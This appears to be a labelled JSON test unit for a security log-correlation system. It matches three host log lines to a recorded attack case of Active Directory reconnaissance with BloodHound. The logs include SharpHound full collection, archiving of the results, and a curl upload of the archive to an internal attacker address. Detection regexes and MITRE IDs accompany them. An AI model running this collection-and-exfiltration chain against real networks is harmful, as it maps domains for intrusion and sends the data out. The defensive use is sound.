@@ -1,0 +1,168 @@
+{
+ "unit": 1102,
+ "gt": {
+  "gt_class": "exact",
+  "gt_case": "CASE-006",
+  "confidence": "high",
+  "needs_review": false,
+  "reason": "与 CASE-006 入库时使用同一组日志"
+ },
+ "technique": "BloodHound 图谱采集（SharpHound All + LDAP 批量查询）",
+ "sources": [
+  "hids",
+  "hids",
+  "hids"
+ ],
+ "logs": [
+  {
+   "timestamp": "2026-07-05 14:31:26",
+   "source": "hids",
+   "log_id": "HID0471872",
+   "content": "SharpHound.exe -c All --zipfilename bh.zip SharpHound.exe SharpHound.exe -c All <== CORP\\jdoe",
+   "event_id": "1102-HID0471872"
+  },
+  {
+   "timestamp": "2026-07-05 14:35:26",
+   "source": "hids",
+   "log_id": "HID0471892",
+   "content": "Compress-Archive C:\\Users\\jdoe\\bh_*.json -Destination bh.zip powershell.exe Compress-Archive <== CORP\\jdoe",
+   "event_id": "1102-HID0471892"
+  },
+  {
+   "timestamp": "2026-07-05 14:36:21",
+   "source": "hids",
+   "log_id": "HID0471897",
+   "content": "curl.exe -T bh.zip http://10.20.7.31/up curl.exe curl.exe -T bh.zip http://10.20.7.31/up <== CORP\\jdoe",
+   "event_id": "1102-HID0471897"
+  }
+ ],
+ "retrieval_full": [
+  {
+   "case_id": "CASE-006",
+   "name": "域内侦察：BloodHound 图谱采集与外传",
+   "summary": "主机侧运行 SharpHound 全量采集 → 压缩采集结果 → 上传到攻击者地址，为后续 Kerberoasting/DCSync 选路。",
+   "matched_steps": 3,
+   "total_steps": 3,
+   "shape": "complete",
+   "longest_run": 3,
+   "tier": "strong",
+   "order_ok": true,
+   "order_assessable": true,
+   "source_fit_ratio": 1.0,
+   "evidence": [
+    {
+     "step_id": "S1",
+     "action_id": "sharphound_collect_all",
+     "label": "SharpHound 全量采集",
+     "event_ids": [
+      "1102-HID0471872"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "generic": false
+    },
+    {
+     "step_id": "S2",
+     "action_id": "archive_collect_result",
+     "label": "压缩采集结果",
+     "event_ids": [
+      "1102-HID0471892"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "generic": false
+    },
+    {
+     "step_id": "S3",
+     "action_id": "upload_collected_zip",
+     "label": "上传采集压缩包",
+     "event_ids": [
+      "1102-HID0471897"
+     ],
+     "sources": [
+      "hids"
+     ],
+     "generic": false
+    }
+   ],
+   "source_mismatches": [],
+   "keyword_score": 24,
+   "keyword_details": [
+    "keyword +3: sharphound.exe",
+    "keyword +3: compress-archive",
+    "keyword +3: bh.zip",
+    "keyword +3: corp\\jdoe",
+    "probe +4: sharphound(?:\\.exe)?\\s+-c\\s+all",
+    "probe +4: compress-archive.{0,80}bh_",
+    "probe +4: curl(?:\\.exe)?\\s+-t\\s+\\S{1,40}\\.zip"
+   ],
+   "mitre": [
+    "T1087.002",
+    "T1069.002",
+    "T1560.001"
+   ],
+   "unobserved_steps": [],
+   "before_steps": [],
+   "gap_steps": [],
+   "predict_next": null,
+   "matched_non_generic_steps": 3
+  }
+ ],
+ "evidence_for_agent": {
+  "tier": "strong",
+  "shape": "complete",
+  "matched_steps": 3,
+  "total_steps": 3,
+  "order_ok": true,
+  "order_assessable": true,
+  "source_fit_ratio": 1.0,
+  "steps": [
+   {
+    "step_id": "S1",
+    "label": "SharpHound 全量采集",
+    "sources": [
+     "hids"
+    ],
+    "generic": false,
+    "event_ids": [
+     "1102-HID0471872"
+    ]
+   },
+   {
+    "step_id": "S2",
+    "label": "压缩采集结果",
+    "sources": [
+     "hids"
+    ],
+    "generic": false,
+    "event_ids": [
+     "1102-HID0471892"
+    ]
+   },
+   {
+    "step_id": "S3",
+    "label": "上传采集压缩包",
+    "sources": [
+     "hids"
+    ],
+    "generic": false,
+    "event_ids": [
+     "1102-HID0471897"
+    ]
+   }
+  ],
+  "unobserved_steps": [],
+  "gap_steps": [],
+  "before_steps": [],
+  "predict_next": null,
+  "source_mismatches": [],
+  "keyword_score": 24,
+  "mitre": [
+   "T1087.002",
+   "T1069.002",
+   "T1560.001"
+  ]
+ }
+}
